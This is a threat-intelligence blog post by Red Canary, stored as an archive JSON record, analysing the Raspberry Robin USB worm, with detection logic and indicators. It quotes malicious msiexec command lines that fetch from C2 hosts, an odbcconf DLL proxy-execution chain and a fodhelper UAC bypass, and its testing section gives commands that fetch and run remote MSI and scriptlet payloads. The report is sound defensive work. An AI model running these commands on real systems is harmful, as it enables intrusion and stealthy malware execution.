{
    "id": "9dfb5dd4-898f-4519-8f8c-fa92da666a52",
    "created_at": "2023-01-12T15:10:40.476231Z",
    "updated_at": "2025-03-27T02:05:30.842842Z",
    "deleted_at": null,
    "sha1_hash": "be7751b850bda304e610bde8d58db42718832f35",
    "title": "2022-05-05 - Raspberry Robin gets the worm early",
    "authors": "",
    "file_creation_date": "2022-05-28T17:40:29Z",
    "file_modification_date": "2022-05-28T17:40:29Z",
    "file_size": 736701,
    "plain_text": "# See what it's like to have a partner in the fight.\n\n**redcanary.com/blog/raspberry-robin/**\n\n_Over the past several months, Red Canary Intelligence has been tracking a cluster of malicious_\n_activity we call Raspberry Robin. Read on for details on what Raspberry Robin is, high-fidelity_\n_opportunities to detect known behaviors, and background on how we decided to cluster this activity._\n\n“Raspberry Robin” is Red Canary’s name for a cluster of activity we first observed in September 2021\ninvolving a worm that is often installed via USB drive. This activity cluster relies on `msiexec.exe to`\ncall out to its infrastructure, often compromised QNAP devices, using HTTP requests that contain a\nvictim’s user and device names. We also observed Raspberry Robin use TOR exit nodes as\nadditional command and control (C2) infrastructure.\n\nLike most activity clusters we track, Raspberry Robin began as a handful of detections with similar\n[characteristics that we saw in multiple customers’ environments, first noticed by Jason Killam from](https://redcanary.com/authors/jason-killam/)\nRed Canary’s Detection Engineering team. We saw Raspberry Robin activity as far back as\nSeptember 2021, though most related activity occurred during or after January 2022. As we observed\nadditional activity, we couldn’t find public reporting to corroborate our analysis, aside from some\nfindings on VirusTotal that we suspected were related based on overlap in C2 domains.\n\nTo date, we’ve observed Raspberry Robin in organizations with ties to technology and manufacturing,\nthough it’s not yet clear if there are other links among victims. We have several intelligence gaps\naround this cluster, including the operators’ objectives. While we don’t yet have the full picture, we\nwant to share what we know about this activity cluster so far to enrich collective understanding of this\n\n\n-----\n\nthreat and empower defenders to identify this activity. We use the cluster name Raspberry Robin to\nrefer to the entire chain of activity described below, including the initial access method, the worm\nitself, and the follow-on execution and C2 activity.\n\nBelow we’ve provided a comprehensive analysis of known Raspberry Robin behavior with\ncorresponding detection opportunities along the way.\n\n_Figure 1: Raspberry Robin event outline_\n\n## Initial access\n\nRaspberry Robin is typically introduced via infected removable drives, often USB devices. The\nRaspberry Robin worm often appears as a shortcut `.lnk file masquerading as a legitimate folder`\non the infected USB device.\n\nSoon after the Raspberry Robin infected drive is connected to the system, the UserAssist registry\nentry is updated and records execution of a ROT13-ciphered value referencing a `.lnk file when`\ndeciphered. In the example below, `q:\\erpbirel.yax deciphers to` `d:\\recovery.lnk .`\n\n_Figure 2: Registry modification with ROT13_ `.lnk file`\n\n## Execution\n\n\n-----\n\nRaspberry Robin first uses `cmd.exe to read and execute a file stored on the infected external drive.`\nThe command is consistent across Raspberry Robin detections we have seen so far, making it\nreliable early evidence of potential Raspberry Robin activity. Typically the command line includes\n```\ncmd /R < to read and execute a file. The use of cmd /R < is not unique to Raspberry Robin, but\n\n```\nthe filename pattern is unique. The filename is made up of five to seven random alphanumeric\ncharacters and a variety of file extensions. Some of the file extensions we’ve seen include `.usb,`\n```\nico, .lnk, .bin, . sv, and .lo . Additionally, the command has sometimes included type,\n\n```\nwhich is a built-in command to display the contents of a file.\n\nHere’s an example of what the whole command might look like:\n\n_Figure 3: Raspberry Robin_ `cmd.exe command`\n\nNext, `cmd.exe typically launches` `explorer.exe and` `msiexec.exe . With Raspberry Robin,`\n```\nexplorer.exe ’s command line can be a mixed-case reference to an external device; a person’s\n\n```\nname, like `LAUREN V ; or the name of the` `.lnk file, like the figure below. The name here has been`\nmodified from the `.lnk file name to` `LNkFILe . While we aren’t sure of this command’s exact`\npurpose, we’ve consistently observed it in Raspberry Robin detections.\n\n\n-----\n\n_Figure 4: Mixed-case command referring to device or name_\n\nRaspberry Robin extensively uses mixed-case letters in its commands. Adversaries sometimes use\nmixed-case syntax in an attempt to evade detection. Case-sensitive, string-based detections written\nto detect `evil may not fire on` `eViL, but` `cmd.exe is case-insensitive and has the flexibility to`\nread and process both commands the same way.\n\n## Command and control (C2)\n\nLet’s look at Raspberry Robin’s `msiexec.exe command in detail, since that informs our first`\nbehavior-based detection opportunity.\n\nWhile `msiexec.exe downloads and executes legitimate installer packages, adversaries also`\nleverage it to deliver malware. Raspberry Robin uses `msiexec.exe to attempt external network`\ncommunication to a malicious domain for C2 purposes. The command line has several key features\nwe have seen across multiple detections:\n\nUse of mixed-case syntax (this is yet another example of mixed case use by Raspberry Robin)\nUse of short, recently-registered domains only containing a few characters, for example\n```\n   v0[.]cx\n\n```\nThe domains in our detections hosted QNAP NAS device login pages around the time of the\nRaspberry Robin activity. We hypothesize Raspberry Robin may use compromised QNAP\ndevices for C2 infrastructure. The use of (ostensibly) compromised QNAP devices for C2\ninfrastructure is not unique to this activity cluster, but we observed operators using these across\nseveral Raspberry Robin-associated detections.\nInclusion of port `8080, a non-standard HTTP web service port, in the URL`\nInclusion of a string of random alphanumeric characters as the URL subdirectory, frequently\nfollowed by the victim’s hostname and username\n\nHere is a modified example of a full malicious Raspberry Robin `msiexec.exe command line`\nmatching all of the above criteria. The random string has been modified, and the victim’s host name\nreplaced with `HOSTNAME, though the domain name remains the original one observed.`\n\n\n-----\n\n_Figure 5: Malicious Raspberry Robin_ `msiexec.exe command`\n\nTo detect suspicious use of `msiexec.exe by Raspberry Robin or other threats, it’s essential to take`\na look at the command line and the URL. Detecting `msiexec.exe making outbound network`\nconnections to download and install packages in the command line interface will give you the\nopportunity to examine the activity and determine if it’s malicious or not.\n\n### Detection opportunity: msiexec.exe downloading and executing packages\n\nIdentify the use of Windows Installer Tool `msiexec.exe to download and execute`\n\npackages in the CLI.\n\nprocess == `('msiexec')`\n\n&&\nprocess_command_line_includes == `('http:', 'https:')`\n\n&&\nprocess_command_line_includes == `('/q', '-q')`\n\n## Persistence\n\nIn several Raspberry Robin detections, we have seen `msiexec.exe go on to install a malicious DLL`\nfile. At this time we are not certain what the DLL does.. We suspect it may establish persistence on\nthe victim’s system. In the detections we saw, the malicious files were created as\n```\nC:\\Windows\\Installer\\MSI****.tmp files. In one case, a file with the same hash was also\n\n```\ncreated as `C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku .`\n\nExamples:\n```\n   C:\\Windows\\Installer\\MSI5C01.tmp\n   C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku\n\n```\nShared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828\n[VirusTotal example](https://www.virustotal.com/gui/file/1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1/)\n\n```\nC:\\Windows\\Installer\\MSIE160.tmp\n\n```\n\nMD5 hash: e8f0d33109448f877a0e532b1a27131a\n[VirusTotal example](https://www.virustotal.com/gui/file/c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c/)\n\n## Execution (again)\n\n\n-----\n\nNext, `msiexec.exe launches a legitimate Windows utility,` `fodhelper.exe, which in turn spawns`\n```\nrundll32.exe to execute a malicious command. Processes launched by fodhelper.exe run\n\n```\nwith elevated administrative privileges without requiring a User Account Control prompt. It is unusual\nfor `fodhelper.exe to spawn any processes as the parent, making this another useful detection`\nopportunity.\n\n### Detection opportunity: fodhelper.exe as a parent process\n\nIdentify Windows Features On Demand helper `fodhelper.exe creating processes as the parent.`\n\nparent_process == `('fodhelper')`\n\nThe `rundll32.exe command starts another legitimate Windows utility, in this case`\n```\nodbcconf.exe, and passes in additional commands to execute and configure the recently-installed\n\n```\nmalicious DLL `bznwi.ku (Hash:` `6f5ea8383bc3bd07668a7d24fe9b0828 ). Here is what that`\ncommand looks like. (We modified the random string values in the command, as well as replaced the\nvictim’s username with `username .)`\n\n_Figure 6: Malicious_ `rundll32.exe command`\n\nThe `-A flag in` `odbcconf.exe specifies an action.` `configdriver loads the driver setup DLL, in`\nthis case `VKIPDSE .` `SETFILEDSNDIR creates the registry location`\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\ODBC\\ODBC.INI\\ODBC File DSN\\DefaultDSNDir, if it does not\n\n```\nalready exist, and specifies the default location used by the ODBC Data Source Administrator when\ncreating a file-based data source. `INSTALLDRIVER adds additional information about the driver.`\n\nIn this detection, we saw `odbcconf.exe successfully execute the malicious command. Since`\n```\nodbcconf.exe has a built-in regsvr flag similar to regsvr32.exe, it can be used by adversaries\n\n```\nto execute DLLs and bypass application control defenses that aren’t monitoring for `odbcconf.exe`\nmisuse.\n\n### Detection opportunity: odbcconf.exe loading .DLLs\n\n\n-----\n\nDetect the Windows Open Database Connectivity utility loading a configuration\n\nfile or DLL. The /A flag specifies an action, `/F uses a response file, and` `/S runs in silent mode.`\n```\nOdbcconf.exe running rgsvr actions in silent mode could indicate misuse.\n\n```\nprocess == `('odbcconf')`\n\n&&\nprocess_command_line_includes == `('regsvr)`\n\n&&\nprocess_command_line_includes == `('/f', '-f')`\n\n||\n\nprocess_command_line_includes == `('/a', '-a')`\n\n\n||\n\nprocess_command_line_includes == `('/s', '-s')`\n\n## C2, part deux\n\nWe observed outbound C2 activity involving the processes `regsvr32.exe,` `rundll32.exe, and`\n```\ndllhost.exe executing without any command-line parameters and making external network\n\n```\nconnections to IP addresses associated with TOR nodes. Additionally, some of the IP addresses in\nthe connections host domains consisting of random alphanumeric characters. For example,\n```\nhxxps[:]//www[.]ivuoq6si2a[.]com/ .\n\n```\nThis activity presents us with a final detection opportunity. It is atypical for `regsvr32.exe,`\n```\nrundll32.exe and dllhost.exe to execute with no command-line parameters and establish\n\n```\nexternal network connections. This behavior is not inherently malicious, but is good to monitor.\n\n### Detection opportunity: network connections from the command line with no parameters\n\nDetect `regsvr32.exe,` `rundll32.exe, and` `dllhost.exe making external network`\n\nconnections with an empty command line.\n\nprocess == `('regsvr32')`\n\n||\n\nprocess == `('rundll32')`\n\n\n||\n\nprocess == `('dllhost')`\n\n&&\nprocess_command_line_contains == `(“”)`\n\n&&\nhas_netconnection\n\n_*Note: Double Quotes (“”) within the command line means null._\n\n\n-----\n\n## Testing\n\n_Editor’s note: We added the testing section to this article on May 11, 2022._\n\nThe detection opportunities listed in this article should offer good coverage against some Raspberry\nRobin-related techniques. However, it’s hard to know if a detection analytic is configured or\nimplemented correctly without testing it. Luckily, we’ve got a few different Atomic Red Team tests that\nshould effectively emulate the pseudo-detection analytics listed above. Note: _[Atomic Red Team is an](https://atomicredteam.io/)_\n_open source library of tests that security professionals can use to validate their security controls._\n\n### Emulating msiexec.exe downloading and executing packages\n\nThis following atomic retrieves an arbitrary MSI file from a remote IP address and executes it. Note\nthat the process is `msiexec.exe and that the command line includes` `/q and` `https: —all of the`\nvariables mentioned in the above detection opportunity. Run the following in the Command Prompt:\n```\nmsiexec.exe /q /i \"https://github.com/redcanaryco/atomic-redteam/raw/master/atomics/T1218.007/src/T1218.007_JScript.msi\"\n\n```\n[You can find the test file in the atomics library here.](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md#atomic-test-11---msiexecexe---execute-remote-msi-file)\n\n### Emulating odbcconf.exe loading DLLs\n\nThe following atomic uses `odbcconf.exe to load and execute a locally stored DLL. Note that the`\nprocess will be `odbcconf.exe and that the command line includes the` `/a and` `/s parameters`\nthat the pseudo detection analytic looks for.\n```\nodbcconf.exe /S /A {REGSVR \"C\\AtomicRedTeam\\atomics\\T1218.008\\src\\Win32\\T1218-2.dll\"}\n\n```\nNote that this test includes a prerequisite. You can find detailed instructions in the T1218.008 atomics\nfolder.\n\n### Emulating network connections from the command line with no parameters\n\nThe following isn’t a perfect atomic for emulating this detection opportunity, but it’ll emulate the\n```\nrundll32.exe process start and the network connection (albeit with a corresponding command\n\n```\nline). Run the following in the Command Prompt.\n```\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\n\";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomicred-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();\n\n```\n[You can find the test file in the atomics library here.](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.md#atomic-test-1---rundll32-execute-javascript-remote-payload-with-getobject)\n\n\n-----\n\n## Intelligence gaps\n\nSeveral unanswered questions about this cluster remain. First and foremost, we don’t know how or\nwhere Raspberry Robin infects external drives to perpetuate its activity, though it’s likely this occurs\noffline or otherwise outside of our visibility. We also don’t know why Raspberry Robin installs a\nmalicious DLL. One hypothesis is that it may be an attempt to establish persistence on an infected\nsystem, though additional information is required to build confidence in that hypothesis.\n\nPerhaps our biggest question concerns the operators’ objectives. Absent additional information on\nlater-stage activity, it’s difficult to make inferences on the goal or goals of these campaigns. Despite\nthis, we hope this information is useful for informing broader efforts to track and better detect\nRaspberry Robin activity. We hope to start a conversation that will help the whole community learn\nmore about this threat. If you’ve been tracking similar activity, we’d love to hear from you and\n[collaborate. Contact intel@redcanary.com with any observations or questions.](http://10.10.0.46/mailto:intel@redcanary.com)\n\n_Thank you to all our contributing researchers who helped make this research possible, especially Jeff_\n_Felling from Red Canary Intelligence and Jason Killam from Red Canary Detection Engineering._\n\n## Appendix\n\n[As we define parameters for an activity cluster, we map behaviors to MITRE ATT&CK where](https://redcanary.com/mitre-attack/)\napplicable and note observables of interest. In some cases, often with infrastructure and certain\nadversary decisions, observables associated with an activity cluster may not neatly map to an\nATT&CK technique, and that’s okay.\n\n**Tactic** **Technique** **Description** **Observable**\n\n\nTactic:\n**Initial**\n**Access**\n\nTactic:\n**Initial**\n**Access**\n\n\nTechnique\n:\nT1091\nReplication\nThrough\nRemovable\nMedia\n\nTechnique\n:\n\n\nDescription:\nIn some cases,\nRaspberry Robin\nwas introduced\nvia infected\nremovable\ndrives. In these\ninstances, the\nworm appeared\nas a shortcut\n(LNK file)\nmasquerading as\na legitimate\nfolder on a USB\ndevice\n\nDescription:\n```\nexplorer.exe\n\n```\nwith a command\nline containing a\nreference to a\ndevice or a name\n\n\nObservable :\ne:\\removable disk.lnk\n\nObservable :\nExpLoRER “USB Drive” or EXPLorEr “LAUREN V” or\n\neXPLOReR LNkFILe\n\n\n-----\n\n**Tactic** **Technique** **Description** **Observable**\n\n\nTactic:\n**Execution**\n\nTactic:\n**Defense**\n**Evasion**\n\nTactic:\n**Defense**\n**Evasion**\n\n\nTechnique\n:\nT1059.003\nCommand\nand\nScripting\nInterpreter\n(Windows\nCommand\nShell)\n\nTechnique\n:\n\nTechnique\n:\nT1218.008\nSigned\nBinary\nProxy\nExecution:\nRundll32\n\nT1218.008\nSigned\nBinary\nProxy\nExecution:\nOdbcconf\n\n\nDescription:\nRaspberry Robin\nuses the\n“standard-in”\ncommand prompt\nfeature `cmd/R`\n```\n< to read and\n\n```\nexecute a file\nwith a name\ncomposed of\nseveral\nseemingly\nrandom\nalphanumeric\ncharacters\n\nDescription:\nThe use of\nmixed-case\nletters, which is\ntradecraft\nsometimes used\nby adversaries to\nevade defenses\n(not unique to\nRaspberry Robin)\n\nDescription:\nRaspberry Robin\nuses legitimate\nWindows utilities\nlike\n```\nfodhelper.exe\n\n```\nand\n```\nodbcconf.exe\n\n```\nto proxy DLL file\nexecution with\n```\nrundll32.exe\n\n```\n\nObservable :\nC:\\Windows\\system32\\cmd.exe” /R CMD<lAkTp.mY0\n\nObservable :\nmSIeXEc, ExpLoRER, or HTtp in a command line\n\nObservable :\n“RUNDLL32.exe” shell32,ShellExec_RunDLLA\n“C:\\WINDOWS\\syswow64\\odbcconf.exe” -A {regsvr\n“C:\\Users\\[redacted]\\AppData\\Local\\Temp\\bznwi.ku.”} E -A {configdriver VKIPDSE} -A {SETFILEDSNDIR\nfnpawxs PXQAND ofeslkscqqczuaj} -a\n{INSTALLDRIVER fqcmypo OGEYSCKXFTBNXAF}\n\n\n-----\n\n**Tactic** **Technique** **Description** **Observable**\n\n\nTactic:\n**C2**\n\nTactic:\n**C2**\n\nTactic:\n**C2**\n\nTactic:\n**C2**\n\nRelated Articles\n\n\nTechnique\n:\nT1218.007\nSigned\nBinary\nProxy\nExecution:\nMsiexec\n\nT1071.001\nApplication\nLayer\nProtocol:\nWeb\nProtocols\n\nTechnique\n:\n\nTechnique\n:\n\nTechnique\n:\nT1218.008\nSigned\nBinary\nProxy\nExecution:\nRundll32\n\nT1218.008\nSigned\nBinary\nProxy\nExecution:\nRegsvr32\n\n\nDescription:\n```\nMsiexec.exe\n\n```\nmaking external\nnetwork\nconnections to\nURLs that\ninclude the\nvictim’s\nhostname and\nusername\n\nDescription:\nRecently\nregistered toplevel domains\nwith few\ncharacters, likely\nused as C2\ninfrastructure\n\nDescription:\nUse of\ninfrastructure tied\nto compromised\nQNAP NAS\ndevices (not\nunique to\nRaspberry Robin)\n\nDescription:\n```\nrundll32.exe\n\n```\nand\n```\nregsvr32.exe\n\n```\nused for C2\ncommunication\n\n\nObservable :\nmsiEXEC /Q -I\nhXxp://3h[.]WF:8080/ZgMaAJK3xTC/LP079LLP=52284\n\nObservable :\n3h[.]WF or v0[.]cx\n\nObservable :\n\nObservable :\nLook for `rundll32.exe and/or` `regsvr32.exe`\nmaking external network connections with no\ncommand-line arguments\n\n\n-----\n\nDetection and response\n\n### ChromeLoader: a pushy malvertiser\n\nDetection and response\n\n### Intelligence Insights: May 2022\n\nDetection and response\n\n### The Goot cause: Detecting Gootloader and its follow-on activity\n\nDetection and response\n\n### Marshmallows & Kerberoasting\n\n**Subscribe to our blog**\n\nOur website uses cookies to provide you with a better browsing experience. More information can be\n[found in our Privacy Policy.](https://redcanary.com/privacy-policy)\n\nX\n\n**Privacy Overview**\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of\nthese cookies, the cookies that are categorized as necessary are stored on your browser as they are\nessential for the working of basic functionalities of the website. We also use third-party cookies that\nhelp us analyze and understand how you use this website. These cookies will be stored in your\nbrowser only with your consent. You also have the option to opt-out of these cookies. But opting out of\nsome of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only\nincludes cookies that ensures basic functionalities and security features of the website. These cookies\ndo not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically\nto collect user personal data via analytics, ads, other embedded contents are termed as nonnecessary cookies. It is mandatory to procure user consent prior to running these cookies on your\nwebsite.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-05 - Raspberry Robin gets the worm early.pdf"
    ],
    "report_names": [
        "2022-05-05 - Raspberry Robin gets the worm early.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536240,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653759629,
    "ts_modification_date": 1653759629,
    "files": {
        "pdf": "https://archive.orkl.eu/be7751b850bda304e610bde8d58db42718832f35.pdf",
        "text": "https://archive.orkl.eu/be7751b850bda304e610bde8d58db42718832f35.txt",
        "img": "https://archive.orkl.eu/be7751b850bda304e610bde8d58db42718832f35.jpg"
    }
}